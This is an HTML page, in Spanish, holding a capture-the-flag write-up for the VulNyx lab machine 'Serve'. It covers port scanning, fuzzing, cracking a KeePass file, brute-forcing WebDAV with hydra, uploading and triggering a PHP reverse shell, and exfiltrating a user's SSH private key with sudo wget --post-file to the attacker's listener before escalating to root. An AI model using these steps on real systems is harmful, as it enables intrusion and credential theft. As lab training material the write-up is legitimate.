@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>    
+    <meta property="og:title" content="✍ VulNyx - Serve " />
+    <meta property="og:description" content="🧠 Creador - d4t4s3c" />
+    
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/serve" />
+    <meta property="og:url" content="https://0x-noname.github.io/writeups/nyx" /> 
+    
+    <meta property="og:image" content="https://0x-noname.github.io/assets/img/logos/logo.png" />
+    <meta property="og:type" content="website" />
+    <meta charset="UTF-8">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="twitter:image" content="https://0x-noname.github.io/assets/img/logos/logo.png" />
+    <meta property="twitter:title" content="VulNyx - Serve" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulNyx - Serve</title>
+    <link rel="shortcut icon" href="../../assets/img/favicon.ico">
+    <link rel="stylesheet"
+      href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
+    <link rel="stylesheet" href="../../assets/css/nyx_w.css">  
+</head>
+<body>
+    <header>
+        <nav class="nav">
+            <a href="../../index">$ home</a>
+            <a href="../../vulnyx">$ nyx</a>
+        </nav>
+    </header>
+    <main class="main">
+        <h1>Pentesting & Ctf Pl4yer</h1>
+        <h2>VulNyx - Serve</h2>
+            <p class="autor">Autor:&nbsp;<code class="code_autor_nyx">d4t4s3c</code></p>
+            <img class="img_nyx" src="../../assets/img/logos/logo.png" alt="logo">
+            <h3>Escaneo de puertos</h3>
+            <pre class="pre__nyx">
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.51
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+            <h3>Escaneo de servicios</h3>
+<pre class="pre__nyx">
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.51
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9a0c755abbbb06a29a7dbe91ca4545e4 (RSA)
+|   256 077de70f0b5e5a90e9337268493bf58c (ECDSA)
+|_  256 6c1532a742e79fda63667d3abefbbf14 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+                          
+            <p>Empiezo con una enumeración de directorios con wfuzz.</p>    
+<pre class="pre__nyx">
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=1 -w /usr/share/seclists/Discovery/Web-Content/common.txt  "http://192.168.1.51/FUZZ"
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+      
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                
+=====================================================================
+000002137:   403        9 L      28 W       277 Ch      "icons"                                                                                
+000002317:   403        9 L      28 W       277 Ch      "javascript"                                                                           
+000003710:   403        9 L      28 W       277 Ch      "server-status"                                                                        
+000003666:   200        7 L      0 W        7 Ch        "secrets"                                                                              
+000004482:   401        14 L     54 W       459 Ch      "webdav"
+</code></pre>
+            <p>Si voy al directorio<code class="code_negrita">&nbsp;wendav&nbsp;</code>veo un panel de login.</p>
+            <img class="img_b" src="../../assets/img/nyx_serve/webdavLogin.png" alt="webdavLogin">
+            <p>Sigo con una enumeración de extensiones.</p>
+<pre class="pre__nyx">
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt  "http://192.168.1.51/FUZZ.FUZ2Z"
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+    
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                    
+=====================================================================
+                                     
+000000027:   403        9 L      28 W       277 Ch      "php"                                                                      
+000002176:   200        11 L     28 W       173 Ch      "notes - txt"
+</code></pre>
+
+            
+            <p>Con curl miro el contenido del archivo<code class="code_negrita">&nbsp;notes.txt&nbsp;</code>.</p>
+<pre class="pre__nyx">
+<code class="code language-txt">❯ curl -s 192.168.1.51/notes.txt
+
+Hi teo,
+
+the database with your credentials to access the resource are in the secret directory  
+(Don't forget to change X to your employee number)
+regards
+
+IT department
+
+</code></pre>
+            <p>Enumero el directorio secrets en búsqueda de extensiones<code class="code_negrita">&nbsp;kdbx&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,kdbx  "http://192.168.1.51/secrets/FUZZ.FUZ2Z"
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                    
+=====================================================================
+    
+000000848:   200        14 L     82 W       1973 Ch     "db - kdbx"       
+</code></pre>
+
+            <p>Uso la herramienta<code class="code_negrita">&nbsp;keepass2john&nbsp;</code>para crear un hash y romperlo con john.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ keepass2john db.kdbx > kpass.txt
+</code></pre>
+
+            <p>En pocos segundos john encuentra la contraseña.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ john --wordlist=/usr/share/wordlists/rockyou.txt kpass.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+    d****s           (db)
+</cde></pre>
+            <p>Abro la herramienta<code class="code_negrita">&nbsp;KeePassXC&nbsp;</code>y cargo el archivo<code class="code_negrita">&nbsp;db.kdbx&nbsp;</code></p>
+            <img class="img_m" src="../../assets/img/nyx_serve/keepassXLoad.png" alt="keepassXLoad">
+            <p>Introduzco la contraseña.</p>
+            <img class="img_b" src="../../assets/img/nyx_serve/keepassX.png" alt="keepassX">
+            <p>Encuentro parte de la contraseña de admin.</p>
+            <img class="img_m" src="../../assets/img/nyx_serve/keepassX-string.png" alt="keepassX-string">
+
+            <p>Siguiendo las indicaciones de<code class="code_negrita">&nbsp;notes.txt&nbsp;</code>creo un diccionario combinando<code class="code_negrita">&nbsp;w3bd4v&nbsp;</code>con números.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ crunch 9 9 -t w3bd4v%%% -o dic_teo.txt
+</code></pre>
+
+            <p>Con hydra encuentro la contraseña de acceso a webdav.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ hydra -l admin -P dic_teo.txt -f 192.168.1.51 http-get /webdav -v -I
+
+[80][http-get] host: 192.168.1.51   login: admin   password: w3bd4vXXX
+</code></pre>
+
+            <p>Me logueo en webdav y veo el indice de webdav.</p>
+            <img class="img_b" src="../../assets/img/nyx_serve/webdavIndexOf.png" alt="webdavIndexOf">
+
+            <p>Como tengo las credenciales de acceso uso curl para subir una shell.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -T rs.php http://192.168.1.51/webdav/ --digest -u admin:w3bd4vXXX
+
+<title>201 Created</title>
+<h1>Created</h1>
+<p>Resource /webdav/rs.php has been created.</p>
+<address>Apache/2.4.38 (Debian) Server at 192.168.1.51 Port 80</address>
+</code></pre>
+
+            <p>Verifico que se haya subido correctamente.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -s http://192.168.1.51/webdav/ --digest -u admin:w3bd4vXXX | html2text
+
+****** Index of /webdav ******
+[[ICO]]       Name             Last_modified    Size Description
+===========================================================================
+[[PARENTDIR]] Parent_Directory                    -  
+[[   ]]       rs.php           2023-05-01 13:01 3.5K  
+===========================================================================
+Apache/2.4.38 (Debian) Server at 192.168.1.51 Port 80
+</code></pre>
+
+            <p>Uso curl para lanzar la shell.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -s http://192.168.1.51/webdav/rs.php --digest -u admin:w3bd4vXXX
+</code></pre>
+
+            <p>Obtengo la shell.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.1.18] from (UNKNOWN) [192.168.1.51] 39418
+Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+            <p>Enumero permisos con sudo.</p>
+<pre class="pre__nyx"><code class="code language-txt">www-data@serve:/$ sudo -l
+                                                                                                                                    
+Matching Defaults entries for www-data on Serve:                                                                                            
+    env_reset, mail_badpass,                                                                                                                
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+                                                                                                                   
+User www-data may run the following commands on Serve:                                                                                      
+    (teo) NOPASSWD: /usr/bin/wget
+</code></pre>
+
+            <p>Lanzo wget con la flag<code class="code_negrita">&nbsp;--post-file=&nbsp;</code>apuntando al<code class="code_negrita">&nbsp;id_rsa&nbsp;</code>de teo para leerlo a través de un netcat que he dejado a la escucha.</p>
+<pre class="pre__nyx"><code class="code language-txt">www-data@serve:/$ sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa 192.168.1.18:1337
+    
+--2023-05-01 13:13:16--  http://192.168.1.18:1337/
+Connecting to 192.168.1.18:1337... connected.
+HTTP request sent, awaiting response...
+</code></pre>
+
+            <p>Obtengo el id_rsa y puedo observar que está protegida.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ nc -lvnp 1337
+
+listening on [any] 1337 ...
+connect to [192.168.1.18] from (UNKNOWN) [192.168.1.51] 39380
+POST / HTTP/1.1
+User-Agent: Wget/1.20.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 192.168.1.18:1337
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1743
+    
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,6D251FAD3AF600FF
+    
+He quitado la llave para que no copies y pegues ;)
+    
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+            <p>Con RSAcrack obtengo el passphrase.</p>
+            <img class="img_m" src="../../assets/img/nyx_serve/rsaCrack.png" alt="rsaCrack">
+
+            <p>Finalmente me conecto al sistema como usuario teo.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ ssh teo@192.168.1.51 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+teo@serve:~$ id
+uid=1000(teo) gid=1000(teo) grupos=1000(teo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+</code></pre>
+
+            <p>Enumero permisos de sudo.</p>
+<pre class="pre__nyx"><code class="code language-txt">teo@serve:~$ sudo -l
+Matching Defaults entries for teo on Serve:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+    
+User teo may run the following commands on Serve:
+    (root) NOPASSWD: /usr/local/bin/bro
+</code></pre>
+
+            <p>Lanzo bro para ver que me muestra.</p>
+<pre class="pre__nyx"><code class="code language-txt">teo@serve:~$ sudo /usr/local/bin/bro 
+                                                                              
+Bro! Specify a command first!                                                                              
+        * For example try bro curl                                                                         
+        * Use bro help for more info
+</code></pre>
+
+            <p>Pruebo<code class="code_negrita">&nbsp;bro curl&nbsp;</code>como me indica el propio programa y observo que puedo escribir.</p>
+            <img class="img_m" src="../../assets/img/nyx_serve/bro.png" alt="bro">
+
+            <p>Escribo<code class="code_negrita">&nbsp;!/bin/bash&nbsp;</code>.</p>
+            <img class="img_m" src="../../assets/img/nyx_serve/broBash.png" alt="broBash">
+
+            <p>Y obtengo el root.</p>
+            <img class="img_m" src="../../assets/img/nyx_serve/bro_root.png" alt="bro_root">
+
+            <p>Y con esto ya tenemos resuelta la máquina Serve del sr D4t4s3c.</p>
+
+    </main>
+        <footer class="footer">
+            <a class="a_footer" href="https://github.com/0x-noname" target="_blank"># noname &copy; 2023<i class="i_footer fa-brands fa-github"></i></a>
+            <script src="../../assets/highlight/highlight.min.js"></script>
+        </footer>
+        <script src="../../assets/highlight/highlight.min.js"></script>
+            <script>hljs.initHighlightingOnLoad();</script>
+            <script src="https://kit.fontawesome.com/46bda9fe9d.js" crossorigin="anonymous"></script>  
+</body>
+</html>
